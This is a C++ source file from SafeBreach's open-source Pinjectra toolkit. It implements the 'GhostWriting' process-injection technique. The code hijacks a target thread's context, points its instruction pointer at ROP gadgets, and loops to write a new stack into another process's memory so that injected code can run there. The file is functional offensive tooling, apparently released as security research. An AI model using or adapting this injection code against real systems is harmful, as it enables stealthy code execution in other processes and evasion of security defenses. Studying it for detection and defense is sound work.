// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include "GhostWriting.h"

extern "C" {
	#include "misc.h"
}

GhostWriting::~GhostWriting()
{
}

PINJECTRA_PACKET* GhostWriting::eval_and_write(TARGET_PROCESS* target, TStrDWORD64Map& params)
{
	HANDLE t = target->thread;
	PINJECTRA_PACKET* payload_output;

	// Evaluate Payload
	payload_output = this->m_rop_chain_gen->eval(params);
	TStrDWORD64Map& tMetadata = *payload_output->metadata;

	// Write address of GADGET_loop to the target thread stack (used as part of the Write Primitive)
	CONTEXT* old_ctx_ptr = (CONTEXT*)tMetadata["OLD_CTX"];
	CONTEXT new_ctx;
	new_ctx = *old_ctx_ptr;
	new_ctx.Rsp -= 0x60;
	new_ctx.Rbx = tMetadata["GADGET_loop"];
	new_ctx.Rdi = new_ctx.Rsp + 0x58;
	new_ctx.Rip = tMetadata["GADGET_write"];
	SetThreadContext(t, &new_ctx);
	ResumeThread(t);
	_wait_until_done(t, tMetadata["GADGET_loop"]);

	DWORD64 rop_pos;
	rop_pos = tMetadata["ROP_POS"];

	DWORD64 new_stack_pos;
	new_stack_pos = tMetadata["NEW_STACK_POS"];

	// Write new stack to target process memory space
 	for (int i = 0; i < rop_pos; i++)
	{
		SuspendThread(t);
		CONTEXT old_ctx;
		old_ctx.ContextFlags = CONTEXT_ALL;
		GetThreadContext(t, &old_ctx);
		CONTEXT new_ctx = old_ctx;
		new_ctx.Rsp -= 0x60;
		new_ctx.Rbx = ((DWORD64*)payload_output->buffer)[i];
		new_ctx.Rdi = new_stack_pos + sizeof(DWORD64) * i;
		new_ctx.Rip = tMetadata["GADGET_write"];
		SetThreadContext(t, &new_ctx);
		ResumeThread(t);
		_wait_until_done(t, tMetadata["GADGET_loop"]);
	}

	return payload_output;
}
